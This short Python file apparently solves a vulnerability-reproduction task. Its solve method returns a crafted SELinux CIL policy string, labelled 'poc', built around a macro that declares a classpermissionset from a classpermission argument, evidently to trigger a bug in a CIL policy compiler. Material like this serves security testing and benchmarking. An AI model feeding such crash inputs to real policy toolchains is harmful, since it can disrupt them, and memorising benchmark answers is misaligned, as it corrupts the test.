import os
from typing import Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = (
            "(block b "
            "(handleunknown allow)"
            "(class file (read))"
            "(type t)"
            "(role r)"
            "(user u)"
            "(userrole u r)"
            "(roletype r t)"
            "(macro m ((cp))(classpermissionset s ($cp)))"
            "(m (classpermission (file (read))))"
            "(allow t t (file (read))))"
        )
        return poc.encode("ascii")